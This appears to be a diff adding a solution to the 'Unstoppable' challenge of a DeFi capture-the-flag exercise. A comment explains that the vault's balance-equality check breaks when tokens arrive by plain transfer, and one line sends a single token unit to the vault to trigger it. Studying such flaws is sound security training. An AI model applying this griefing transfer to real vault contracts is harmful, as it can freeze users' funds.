@@ -45,6 +45,13 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // The vault contract check does not take into account that the balance 
+        // can be changed by a regular transfer:
+        //
+        // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+ 
+        await token.connect(player).transfer(vault.address, 1n);
     });
 
     after(async function () {
